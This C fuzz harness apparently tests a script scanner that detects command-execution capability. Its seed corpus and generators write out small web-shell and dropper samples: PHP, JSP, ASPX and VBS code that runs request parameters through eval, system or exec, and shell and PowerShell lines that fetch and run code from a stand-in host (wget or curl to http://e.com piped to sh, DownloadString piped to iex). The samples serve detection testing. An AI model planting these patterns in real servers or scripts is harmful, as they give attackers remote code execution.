/*
 * diag/scan_text - the TEXT route over generated scripts, one seed per language row, with mutation that knows the grammar.
 *
 * The input is [language byte][script]. The driver's byte mutators run first (bit flips, interesting values, splices, the dictionary
 * of quotes, brackets, heredoc and island openers); then the adapter applies one STRUCTURAL attack chosen by the rng, because a byte
 * flip almost never makes a thousand-deep bracket or a variable assigned sixty-five times:
 *   unbalance   one opener nothing closes: a quote, a bracket, a heredoc, a block comment, an island tag
 *   nest        the script wrapped in N brackets or command substitutions, N at and around the bounds (31 32 33 64 100 300)
 *   huge        a string literal of 1 KiB .. 192 KiB in front of a call
 *   bytes       NUL, CR, VT, FF and 0x80.. bytes dropped at random places (G12, G13, L14)
 *   names       the names that share one FNV-1a hash (G1; the table is built once in seeds()), as variables and as functions
 *   count       N appends / N aliases / N nested functions / N `global` names / N paths / N definitions, N at and around the bounds
 *               G4 (pieces), G5 (alias chain), G6 (scope depth), G7 (lists), G10 (paths), G11 (definitions), G14 (layers)
 * and the language row can be wrong (the byte is taken modulo the count plus one: NONE and a row that does not exist).
 *
 * Held:
 *   - the graph satisfies the invariants of diag_check_graph; the status is in the enum; a scan that comes back NULL says why
 *   - WORK, counted and not timed (G1, G7, G11): probes <= 64 n + 4096, edges <= 4 n + 4096, listed <= 3 n + 64 (n = bytes), and the
 *     evaluator's steps are bounded
 *   - the names the walk told (on_node through the tell) are the names kgenome_diag_text_names tells for the same text, in the
 *     same order, each once, and the language's table knows each of them by its spelling
 *   - the constants the evaluator reports (on_const, on_head) are inside the text, in order, none holding another
 *   - RULE 4 on the shapes of the `count` attack: when the bytes carry the evidence (the node of the final call) the graph has it,
 *     or the status / the cut count says it was lost - never neither
 *   - G9 (strict mode only, -DDIAG_STRICT_G9, finding F17): with an allocation refused the graph is the clean one or the status says it may be short
 */
#include <stdarg.h>

#include "diag_seed.h"

#include <phenotype/diag_text_names.h>

#include "../../lib/genome/diag_text_collide.h"

enum { MAXN = 65536, SCR = 262144 + 4096 };

static char **collide_names;
static size_t n_collide;

static const struct { uint32_t lang; const char *text; } SEEDS[] = {
	{ KGENOME_TEXTUAL_LANG_PHP, "<?php function x($t){ return gzuncompress(base64_decode($t)); }\n$f=str_replace('k','','ckrekatek_fuknkkction'); $s=$f('',$_POST[0]); $s();\neval(x($_POST[1]));\n$n='sys'.'tem'; $n($_GET[2]);\n" },
	{ KGENOME_TEXTUAL_LANG_PHP, "<?php $x = $_GET[0]; function f($a, $b){ global $x; return g($b); } function g($c){ system($c); return $c; } system(f($_POST[0], $_POST[1]));\n" },
	{ KGENOME_TEXTUAL_LANG_SH, "#!/bin/sh\nx=/tmp/a\ny=ev\nz=al\nwget -O $x http://e.com/x\nchmod +x $x\nsh $x\n$y$z \"$(echo hi | base64 -d)\"\ncurl http://e.com/p | sh\n" },
	{ KGENOME_TEXTUAL_LANG_JS, "var a = atob(s); var f = 'ev' + 'al'; window[f](a); var g = (x) => { return eval(x); }; g(a); function h(p) { return p; } eval(h(a));\n" },
	{ KGENOME_TEXTUAL_LANG_VBS, "a = Request(\"x\")\r\nFunction f(b)\r\nDim c, d\r\nc = b\r\nCreateObject(\"WScript.Shell\").Run c\r\nf = c\r\nEnd Function\r\nExecute f(a)\r\n" },
	{ KGENOME_TEXTUAL_LANG_ASP, "<%\nDim a\na = Request(\"x\")\nExecute(a)\nCreateObject(\"WScript.Shell\").Run a\n%>\n" },
	{ KGENOME_TEXTUAL_LANG_JSP, "<% String c = request.getParameter(\"c\"); Runtime.getRuntime().exec(c); %>\n" },
	{ KGENOME_TEXTUAL_LANG_ASPX, "<%@ Page Language=\"C#\" %><% string c = Request[\"c\"]; System.Diagnostics.Process.Start(c); %>\n" },
	{ KGENOME_TEXTUAL_LANG_PY, "import os, base64\nd = base64.b64decode(s)\ndef run(cmd):\n    os.system(cmd)\nrun(d)\nexec(d)\n" },
	{ KGENOME_TEXTUAL_LANG_PERL, "my $c = $ENV{'C'};\nsystem($c);\neval($c);\nmy $d = 'sys' . 'tem';\n&$d($c);\n" },
	{ KGENOME_TEXTUAL_LANG_RUBY, "c = params[:c]\nsystem(c)\neval(c)\nx = \"#{`id`}\"\nexec(c)\n" },
	{ KGENOME_TEXTUAL_LANG_LUA, "local c = io.read()\nos.execute(c)\nloadstring(c)()\nlocal f = io.popen(c)\n" },
	{ KGENOME_TEXTUAL_LANG_TCL, "set c [gets stdin]\nexec $c\neval $c\nset f [open $c r]\nputs $f\n" },
	{ KGENOME_TEXTUAL_LANG_BAT, "@echo off\r\nset c=calc.exe\r\nstart %c%\r\ncmd /c %c%\r\npowershell -enc AAAA\r\n" },
	{ KGENOME_TEXTUAL_LANG_PSH, "$c = Read-Host\nInvoke-Expression $c\niex $c\n$w = New-Object Net.WebClient\n$w.DownloadString('http://e.com/x') | iex\n" },
	{ KGENOME_TEXTUAL_LANG_CFM, "<cfset c = url.c>\n<cfexecute name=\"#c#\" arguments=\"-a\"></cfexecute>\n<cfscript>evaluate(c);</cfscript>\n" },
};

static const char *const dict[] = { "\"", "'", "(", ")", "{", "}", "[", "]", "$(", "`", "<<EOF\n", "EOF\n", "/*", "*/", "<?php", "?>", "<%", "%>", "\\\n", "\r\n", "\r",
				    "\x0b", "\x0c", "$", "${", "#{", "@(", ".=", "global ", "Dim ", "function ", "def ", "eval(", "system(", NULL };

static void seeds(struct fz_corpus *c)
{
	size_t i, l;
	char buf[4096];

	for (i = 0; i < sizeof SEEDS / sizeof SEEDS[0]; i++) {
		char nm[32];

		l = strlen(SEEDS[i].text);
		buf[0] = (char)SEEDS[i].lang;
		memcpy(buf + 1, SEEDS[i].text, l);
		snprintf(nm, sizeof nm, "lang%u-%zu", SEEDS[i].lang, i);
		fz_corpus_add(c, nm, buf, l + 1u);
	}
	(void)names_free;
	if (!collide_names)
		collide_names = collide(KOF_HASH_INIT, 5u, &n_collide);
}

/* ---- the structural attacks ------------------------------------------------------------------------------------------------ */

struct sb {
	char  *p;
	size_t n;
};

static void cat(struct sb *b, const char *s, size_t n)
{
	if (b->n + n <= SCR) {
		memcpy(b->p + b->n, s, n);
		b->n += n;
	}
}

static void cats(struct sb *b, const char *s)
{
	cat(b, s, strlen(s));
}

static void catf(struct sb *b, const char *fmt, ...) __attribute__((format(printf, 2, 3)));

static void catf(struct sb *b, const char *fmt, ...)
{
	va_list ap;
	char t[512];
	int n;

	va_start(ap, fmt);
	n = vsnprintf(t, sizeof t, fmt, ap);
	va_end(ap);
	if (n > 0)
		cat(b, t, (size_t)n < sizeof t ? (size_t)n : sizeof t - 1u);
}

/* the counts at and around every bound the route has */
static unsigned pick_count(struct fz_rng *r)
{
	static const unsigned v[] = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 15, 16, 17, 31, 32, 33, 63, 64, 65, 100, 255, 256, 257, 1000, 1500 };

	return v[fz_below(r, sizeof v / sizeof v[0])];
}

/* An evidence-carrying shape: when `*evidence` comes back set, the final call (system / exec / eval) is a node the graph must have. */
static void shape_count(struct sb *b, uint32_t lang, struct fz_rng *r, int *evidence)
{
	unsigned n = pick_count(r), k, kind = (unsigned)fz_below(r, 6);

	*evidence = 0;
	switch (lang) {
	case KGENOME_TEXTUAL_LANG_PHP:
		cats(b, "<?php\n");
		switch (kind) {
		case 0:                                           /* G4: a name built from n appends */
			cats(b, "$v = 's';\n");
			for (k = 0; k < n; k++)
				cats(b, "$v .= '';\n");
			cats(b, "$v .= 'ystem'; $v($_GET[0]);\n");
			*evidence = 1;
			break;
		case 1:                                           /* G5: an alias chain of n variables */
			cats(b, "$a0 = 'system';\n");
			for (k = 1; k <= n; k++)
				catf(b, "$a%u = $a%u;\n", k, k - 1u);
			catf(b, "$a%u($_GET[0]);\n", n);
			*evidence = 1;
			break;
		case 2:                                           /* G6: functions nested n deep, the request in the innermost */
			for (k = 0; k < n; k++)
				catf(b, "function f%u(){ ", k);
			cats(b, "system($_GET[0]);");
			for (k = 0; k < n; k++)
				cats(b, " }");
			cats(b, "\n");
			*evidence = 1;
			break;
		case 3:                                           /* G7: a global list of n names */
			cats(b, "$x = $_GET[0]; function f(){ global ");
			for (k = 0; k < n; k++)
				catf(b, "$g%u, ", k);
			cats(b, "$x; system($x); }\n");
			*evidence = 1;
			break;
		case 4:                                           /* G14: code a script computes, nested n deep */
			cats(b, "eval(");
			for (k = 0; k < n; k++)
				cats(b, "strrev(");
			cats(b, "'x'");
			for (k = 0; k < n; k++)
				cats(b, ")");
			cats(b, ");\nsystem($_GET[0]);\n");
			*evidence = 1;
			break;
		default:                                          /* G11: one name defined n times and called n times */
			for (k = 0; k < n; k++)
				cats(b, "function d($a){ return $a; }\n");
			for (k = 0; k < n; k++)
				cats(b, "d($_GET[0]);\n");
			cats(b, "system($_GET[1]);\n");
			*evidence = 1;
			break;
		}
		break;
	case KGENOME_TEXTUAL_LANG_SH:
		cats(b, "#!/bin/sh\n");
		if (kind % 2u) {                                  /* G10: chmod of n files, the last the one run */
			cats(b, "chmod +x");
			for (k = 0; k < n; k++)
				catf(b, " /tmp/f%u", k);
			cats(b, " /tmp/last\nsh /tmp/last\n");
		} else {                                          /* G5: an alias chain */
			cats(b, "a0=/tmp/f\n");
			for (k = 1; k <= n; k++)
				catf(b, "a%u=$a%u\n", k, k - 1u);
			catf(b, "wget -O $a%u http://e.com/x\nchmod +x $a%u\nsh $a%u\n", n, n, n);
		}
		break;
	case KGENOME_TEXTUAL_LANG_VBS:
		cats(b, "Function f(a)\r\nDim ");
		for (k = 0; k < n; k++)
			catf(b, "v%u, ", k);
		cats(b, "w\r\nw = a\r\nExecute w\r\nEnd Function\r\nf(Request(\"x\"))\r\n");   /* G7: a Dim list of n names */
		break;
	default:
		cats(b, "x = (");
		for (k = 0; k < n; k++)
			cats(b, "(");
		cats(b, "1");
		for (k = 0; k < n; k++)
			cats(b, ")");
		cats(b, ")\neval(x)\n");
		break;
	}
}

static const char *const OPEN[] = { "\"", "'", "(", "{", "[", "<<EOF\n", "/*", "<?php ", "<%", "$(", "`", "\"\"\"", "#{", "@'\n", "<cfscript>", "${" };
static const char *const WRAP[] = { "(", "[", "{", "$(", "`(", "\"#{", "<%(" , "@(" };
static const char BAD[] = { 0x00, 0x0d, 0x0b, 0x0c, (char)0x80, (char)0xff, 0x1a, 0x7f };

/* Build the attacked text in `out`; returns its length. */
static size_t attack(char *out, const char *text, size_t n, uint32_t lang, struct fz_rng *r, int *evidence)
{
	struct sb b = { out, 0 };
	unsigned mode = (unsigned)fz_below(r, 12), k;

	*evidence = 0;
	switch (mode) {
	case 0: case 1:                                       /* unbalance */
		cat(&b, text, n);
		cats(&b, OPEN[fz_below(r, sizeof OPEN / sizeof OPEN[0])]);
		if (fz_below(r, 2))
			cats(&b, "system($_GET[0]);\n");
		break;
	case 2: case 3: {                                     /* nest */
		unsigned depth = pick_count(r) * (fz_below(r, 4) ? 1u : 8u);
		const char *w = WRAP[fz_below(r, sizeof WRAP / sizeof WRAP[0])];
		size_t cut = n ? (size_t)fz_below(r, n + 1u) : 0;

		cat(&b, text, cut);
		for (k = 0; k < depth; k++)
			cats(&b, w);
		cats(&b, "system($_GET[0])");
		if (fz_below(r, 2))
			for (k = 0; k < depth; k++)
				cat(&b, ")", 1);
		cat(&b, text + cut, n - cut);
		break;
	}
	case 4: {                                             /* huge literal */
		static const unsigned len[] = { 1024, 4096, 65535, 65536, 65537, 131072, 196608 };
		unsigned l = len[fz_below(r, sizeof len / sizeof len[0])];
		const char *q = fz_below(r, 2) ? "'" : "\"";

		cat(&b, text, n);
		cats(&b, "\n$big = ");
		cats(&b, q);
		for (k = 0; k < l && b.n + 8u < SCR; k++)
			b.p[b.n++] = (char)('a' + (k * 7u) % 26u);
		cats(&b, q);
		cats(&b, ";\nsystem($big);\n");
		break;
	}
	case 5: case 6: {                                     /* bytes */
		unsigned m = 1u + (unsigned)fz_below(r, 24);

		cat(&b, text, n);
		for (k = 0; k < m && b.n; k++) {
			size_t at = (size_t)fz_below(r, b.n);

			b.p[at] = BAD[fz_below(r, sizeof BAD)];
		}
		break;
	}
	case 7: {                                             /* names that share one hash */
		unsigned form = (unsigned)fz_below(r, 3);

		if (lang == KGENOME_TEXTUAL_LANG_PHP)
			cats(&b, "<?php\n");
		else if (lang == KGENOME_TEXTUAL_LANG_SH)
			cats(&b, "#!/bin/sh\n");
		for (k = 0; k < n_collide; k++) {
			if (lang == KGENOME_TEXTUAL_LANG_SH)
				catf(&b, "%s=%u\n", collide_names[k], k);
			else if (form == 0)
				catf(&b, "$%s = %u;\n", collide_names[k], k);
			else if (form == 1)
				catf(&b, "function %s($a){ return $a; }\n%s($_GET[0]);\n", collide_names[k], collide_names[k]);
			else
				catf(&b, "var %s = %u;\n", collide_names[k], k);
		}
		cat(&b, text, n);
		break;
	}
	case 8: case 9: case 10:                              /* count: at and around the bounds */
		shape_count(&b, lang, r, evidence);
		break;
	default:                                              /* the script itself, unchanged */
		cat(&b, text, n);
		break;
	}
	return b.n;
}

/* ---- the observers ----------------------------------------------------------------------------------------------------------- */

struct told {
	struct fz_ctx *c;
	uint32_t       lang;
	uint32_t       n;
	uint64_t       h;
	char           first[64][48];
	uint32_t       nfirst;
};

static void on_name(void *u, const char *name, uint32_t len)
{
	struct told *t = (struct told *)u;

	t->n++;
	fz_step(&t->c->steps, 1);
	FZ_CHECK(t->c, name && strlen(name) == len, "a told name whose length is not its spelling's");
	FZ_CHECK(t->c, len > 0 && len < 256u, "a told name of length zero or past 255");
	if (name && t->nfirst < 64u) {
		uint32_t i;

		for (i = 0; i < t->nfirst; i++)
			FZ_CHECK(t->c, strcmp(t->first[i], name) != 0, "a name told twice");
		snprintf(t->first[t->nfirst++], sizeof t->first[0], "%s", name);
	}
	if (name) {
		const char *p;

		for (p = name; *p; p++)
			t->h = (t->h ^ (uint8_t)*p) * 0x100000001b3ull;
		FZ_CHECK(t->c, kgenome_diag_text_cap_of_name(t->lang, name) != KGENOME_NUCLEO_NONE, "a told name the language's table has no capability for");
	}
	t->h = (t->h ^ 0xffu) * 0x100000001b3ull;
}

struct cst {
	struct fz_ctx *c;
	uint64_t       n, last_end, count, heads;
};

static void on_head(void *u, uint64_t off, uint64_t len, const uint8_t *v, uint32_t n)
{
	struct cst *s = (struct cst *)u;

	s->heads++;                               /* the heads are the callee variables' bytes, a name each: inside the text, and a plain name */
	FZ_CHECK(s->c, off <= s->n && len <= s->n - off, "a call head outside the text");
	FZ_CHECK(s->c, len > 0 && n > 0 && v != NULL, "a call head with no bytes or no name");
}

static void on_const(void *u, uint64_t off, uint64_t len, const uint8_t *v, uint32_t n)
{
	struct cst *s = (struct cst *)u;

	s->count++;
	fz_step(&s->c->steps, 1);
	FZ_CHECK(s->c, off <= s->n && len <= s->n - off, "a constant outside the text");
	FZ_CHECK(s->c, off >= s->last_end, "constants out of order, or one holds another");
	FZ_CHECK(s->c, v != NULL || n == 0, "a constant with a length and no bytes");
	s->last_end = off + len;
}

/* the test double of the engine's algorithms: the few the shapes need */
static int apply(void *u, const struct kgenome_textual_call *c, const uint8_t *in, uint32_t len, uint8_t *out, uint32_t cap, uint32_t *n)
{
	uint32_t i;

	(void)u;
	if (len > cap)
		return 0;
	switch (c->op) {
	case KGENOME_TEXTUAL_DEC_REVERSE:
		for (i = 0; i < len; i++)
			out[i] = in[len - 1u - i];
		break;
	case KGENOME_TEXTUAL_DEC_LOWER:
		for (i = 0; i < len; i++)
			out[i] = (uint8_t)(in[i] >= 'A' && in[i] <= 'Z' ? in[i] + 32 : in[i]);
		break;
	case KGENOME_TEXTUAL_DEC_UPPER:
		for (i = 0; i < len; i++)
			out[i] = (uint8_t)(in[i] >= 'a' && in[i] <= 'z' ? in[i] - 32 : in[i]);
		break;
	case KGENOME_TEXTUAL_DEC_TRIM:
		memcpy(out, in, len);
		break;
	default:
		return 0;
	}
	*n = len;
	return 1;
}

static struct { uint64_t in_hash, sig; int have; } clean;

static uint64_t hash_in(const uint8_t *p, size_t n)
{
	uint64_t h = 1469598103934665603ull;
	size_t i;

	for (i = 0; i < n; i++)
		h = (h ^ p[i]) * 1099511628211ull;
	return h ^ n;
}

static int count_cap(const struct kgenome_diag_scan *s, uint16_t cap)
{
	uint32_t i, n = kgenome_diag_scan_count(s);
	int k = 0;

	for (i = 0; i < n; i++)
		k += kgenome_diag_scan_at(s, i)->cap == cap;
	return k;
}

static int run(struct fz_ctx *c, const uint8_t *in, size_t n)
{
	static char text[SCR + 8];
	static char scratch[SCR + 8];
	struct kgenome_diag_text_req rq;
	struct kgenome_diag_text_work w;
	struct kgenome_diag_scan *s;
	struct kgenome_diag_text_names_acc *acc;
	struct told tell, ref;
	struct cst cs, hs;
	enum kgenome_status refused = KGENOME_OK;
	uint32_t lang;
	size_t tn, len;
	int evidence = 0;

	if (n < 1)
		return 1;
	lang = (uint32_t)in[0] % ((uint32_t)KGENOME_TEXTUAL_LANG_COUNT + 1u);
	len = n - 1u > MAXN ? MAXN : n - 1u;
	memcpy(scratch, in + 1, len);
	tn = attack(text, scratch, len, lang, c->rng, &evidence);
	if (tn > MAXN * 4u)
		tn = MAXN * 4u;
	/* the table questions */
	FZ_CHECK(c, (kgenome_diag_text_serves(lang) != 0) == (kgenome_diag_text_target(lang) != 0), "serves and target disagree on a language");
	(void)kgenome_diag_text_reads_view(lang);
	FZ_CHECK(c, kgenome_diag_text_cap_of_name(lang, "") == KGENOME_NUCLEO_NONE, "the empty name has a capability");
	memset(&w, 0, sizeof w);
	memset(&tell, 0, sizeof tell); memset(&ref, 0, sizeof ref);
	memset(&cs, 0, sizeof cs); memset(&hs, 0, sizeof hs);
	tell.c = c; tell.lang = lang; ref.c = c; ref.lang = lang; cs.c = c; cs.n = tn; hs.c = c; hs.n = tn;
	acc = kgenome_diag_text_names_new(lang, on_name, &tell);
	memset(&rq, 0, sizeof rq);
	rq.base = (const uint8_t *)text;
	rq.size = tn;
	rq.lang = lang;
	rq.refused = &refused;
	rq.apply = fz_below(c->rng, 4) ? apply : NULL;
	rq.on_node = acc ? kgenome_diag_text_names_node : NULL;
	rq.user = acc;
	if (fz_below(c->rng, 2)) {
		rq.on_const = on_const; rq.const_user = &cs; rq.on_head = on_head;
	}
	rq.work = &w;
	s = kgenome_diag_scan_text(&rq);
	if (!s) {
		FZ_CHECK(c, (unsigned)refused <= (unsigned)KGENOME_NOMEM, "refused outside the enum");
		fz_digest(c, 0x7e07u + (unsigned)refused);
	} else {
		uint64_t sig = ds_graph_sig(s), ih = hash_in((const uint8_t *)text, tn);
		enum kgenome_status st = kgenome_diag_scan_status(s);

		diag_check_graph(c, s, KGENOME_DIAG_RUN_TEXT);
		/* WORK, counted */
		FZ_CHECK(c, w.probes <= 64u * (uint64_t)tn + 4096u, "G1: the tables probed more than 64 slots a byte (a flooded table is quadratic)");
		FZ_CHECK(c, w.edges <= 4u * (uint64_t)tn + 4096u, "G11: more summary edges than four a byte");
		FZ_CHECK(c, w.listed <= 3u * (uint64_t)tn + 64u, "G7: a list was read again by the one after it");
		{
			uint64_t peak = 0;

			(void)kgenome_diag_scan_bytes(s, &peak);
			/* SPACE: the ledger holds about 290 bytes a byte of text on the worst shape measured (one name defined and called 4097 times);
			 * the bound is linear in the text, with room: a table sized from a count the text states, and not from its bytes, shows here. */
			FZ_CHECK(c, peak <= 512u * (uint64_t)tn + (1u << 20), "the scan holds more than 512 bytes of ledger per byte of text");
		}
		fz_step(&c->steps, w.steps / 64u);
		fz_step(&c->steps, w.probes / 64u);
		/* every node's position is in the text */
		{
			uint32_t i, cnt = kgenome_diag_scan_count(s);

			for (i = 0; i < cnt; i++)
				FZ_CHECK(c, kgenome_diag_scan_at(s, i)->at <= tn, "a node of the text route past the text");
		}
		/* RULE 4: the evidence is there, or the cut is said */
		if (evidence && kgenome_diag_text_serves(lang) && tn <= MAXN) {
			int found = count_cap(s, KGENOME_NUCLEO_EXEC_IMAGE);

			FZ_CHECK(c, found > 0 || st != KGENOME_OK || kgenome_diag_scan_eval_cut(s) || kgenome_diag_scan_refused(s) ||
				 (lang != KGENOME_TEXTUAL_LANG_PHP && lang != KGENOME_TEXTUAL_LANG_SH && lang != KGENOME_TEXTUAL_LANG_VBS),
				 "RULE 4: the shape carries a call of system and the graph has no node for it and says nothing");
		}
		if (!c->failk) {
			clean.in_hash = ih; clean.sig = sig; clean.have = 1;
		} else if (clean.have && clean.in_hash == ih && st == KGENOME_OK) {
#ifdef DIAG_STRICT_G9
			FZ_CHECK(c, sig == clean.sig, "G9: a refused allocation made a different graph and the status is ok");
#else
			/* F17 (diag_text_cmdval.c cv_new): the shell reader's refused allocation is not noted. Counted in the digest; -DDIAG_STRICT_G9 fails. */
			/* KNOWN DEFECT WP9-F17 (2026-10-25, M): this row pins it, green until fixed. */
			fz_digest(c, sig == clean.sig ? 0u : 0x69u);
#endif
		}
		fz_digest(c, sig);
		fz_digest(c, w.edges);        /* not probes: the hash is seeded per text by an address, the probe count differs between runs */
		kgenome_diag_scan_free(s);
	}
	if (acc)
		kgenome_diag_text_names_free(acc);
	{
		/* the tell called by hand: a name is told once, whatever the number of calls, and a name the table has not is not told */
		struct told one;
		struct kgenome_diag_text_names_acc *a2;

		memset(&one, 0, sizeof one);
		one.c = c; one.lang = lang;
		a2 = kgenome_diag_text_names_new(lang, on_name, &one);
		if (a2) {
			kgenome_diag_text_names_node(a2, "system");
			kgenome_diag_text_names_node(a2, "system");
			kgenome_diag_text_names_node(a2, "no_such_name_xyz");
			FZ_CHECK(c, one.n <= 1u, "a name told twice by a second call, or a name the table has not");
			kgenome_diag_text_names_free(a2);
		}
	}
	/* the names, by the other door: the same text, the same order */
	{
		struct fz_ctx *cc = c;

		(void)cc;
		kgenome_diag_text_names((const uint8_t *)text, tn, lang, rq.apply, on_name, &ref);
		if (!c->failk && tell.n)
			FZ_CHECK(c, (ref.h == tell.h && ref.n == tell.n) || ref.n == 0, "the tell of the scan and kgenome_diag_text_names disagree");
		fz_digest(c, ref.n);
	}
	fz_digest(c, tn);
	return 0;
}

FZ_ADAPTER(scan_text, .name = "kgenome/diag_scan_text",
	   .covers = "kgenome_diag_scan_text kgenome_diag_text_names kgenome_diag_text_names_new kgenome_diag_text_names_node "
		     "kgenome_diag_text_names_free kgenome_diag_text_serves kgenome_diag_text_reads_view kgenome_diag_text_target "
		     "kgenome_diag_text_cap_of_name",
	   .flags = FZ_MAY_HIT_CAP | FZ_KEEPS_STATE, .backstop_s = 3000, .steps_base = 8000000u, .steps_per_byte = 256,
	   .shape = FZ_REQ, .seeds = seeds, .dict = dict, .run = run);
